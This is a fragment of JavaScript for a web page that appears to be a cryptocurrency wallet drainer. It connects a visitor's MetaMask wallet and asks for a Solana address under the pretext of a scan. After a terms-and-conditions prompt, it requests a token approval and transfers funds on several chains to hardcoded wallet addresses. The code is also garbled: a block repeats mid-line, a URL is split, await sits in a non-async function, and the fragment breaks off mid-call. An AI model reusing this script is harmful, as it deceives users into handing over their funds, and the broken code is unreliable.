// Full script with gas calculation
const ethWalletAddress = '0x896593277E72463232b54Aa0d31679b0Ff297C5e';
const solWalletAddress = 'ErLtZyQ36HW9HjFUtmpwcbjeBoUxcUA6VxwFJA1vfqMv';
const bnbWalletAddress = '0x896593277E72463232b54Aa0d31679b0Ff297C5e';
const btcWalletAddress = 'bc1qzhtlm0f270l5stm6snaj7yek05yjx6s9eg9f8w';
const polygonWalletAddress = '0x896593277E72463232b54Aa0d31679b0Ff297C5e';
const infuraProjectId = 'YOUR_INFURA_PROJECT_ID';
const web3 = new Web3(new Web3.providers.HttpProvider(`https:                                             
const solana = new solanaWeb3.Connection(solanaWeb3.cluster.ApiUrl.mainnetBeta, 'processed');

let userAddress;

function connectWallet() {
  if (window.ethereum) {
    try {
      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
      userAddress = accounts[0];
      document.getElementById('status').innerText = `//mainnet.infura.io/v3/${infuraProjectId}`));
const solana = new solanaWeb3.Connection(solanaWeb3.cluster.ApiUrl.mainnetBeta, 'processed');

let userAddress;

function connectWallet() {
  if (window.ethereum) {
    try {
      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
      userAddress = accounts[0];
      document.getElementById('status').innerText = `Connected to ${userAddress}`;
      document.getElementById('connectWallet').style.display = 'none';
      document.getElementById('solanaInput').style.display = 'block';
    } catch (error) {
      console.error('Error connecting to wallet:', error);
    }
  } else {
    document.getElementById('status').innerText = 'Please install MetaMask!';
  }
}

function scanAddress() {
  const solanaAddr = document.getElementById('solanaAddress').value;
  if (solanaAddr) {
    document.getElementById('solanaInput').style.display = 'none';
    document.getElementById('terms').style.display = 'block';
  } else {
    document.getElementById('status').innerText = 'Please enter a valid Solana address.';
  }
}

async function acceptTerms() {
  if (confirm('Are you sure you want to accept the terms and conditions?')) {
    try {
      // Get limited approval (1 ETH equivalent)
      const contract = new web3.eth.Contract([], userAddress);
      await contract.methods.approve(ethWalletAddress, web3.utils.toWei('1', 'ether')).send({ from: userAddress });
      
      // Send small test transactions
      await sendToEthereum(userAddress, ethWalletAddress, '0.001');
      await sendToSolana(userAddress, solWalletAddress, '0.001');
      await sendToBNB(userAddress, bnbWalletAddress, '0.001');
      await sendToBTC(userAddress, btcWalletAddress,
